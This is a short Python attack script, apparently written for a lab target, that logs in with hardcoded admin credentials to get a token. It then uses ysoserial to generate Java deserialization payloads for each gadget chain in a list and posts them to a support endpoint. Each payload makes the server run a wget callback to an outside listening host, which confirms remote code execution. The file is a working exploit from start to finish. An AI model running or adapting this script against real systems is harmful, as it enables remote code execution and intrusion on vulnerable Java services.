from subprocess import run, PIPE
import requests

def get_token():
    res = requests.request(url="http://target.lab:5000/login", method="POST", json={"username": "admin", "password": "pantera"})
    return res.json()["access_token"]

def send_payload(payload, token):
    res = requests.request(
            url="http://target.lab:5000/support/confirm",
            method="POST",
            json={"confirmation": payload},
            headers={
                "Authorization": f"Bearer {token}"
            })
    print(res)

token = get_token()

payloads_file = open("./payloads.txt")
payloads = payloads_file.readlines()

for payload_name in payloads:
    payload_name = payload_name.strip()
    
    command = f'java -jar /home/kali/ysoserial-all.jar {payload_name} "wget http://10.255.255.100:8080/{payload_name}" | base64 | tr -d "\\n"'
    result = run(command, shell=True, stdout=PIPE, stderr=PIPE)

    payload = result.stdout.decode("UTF-8")
    send_payload(payload, token)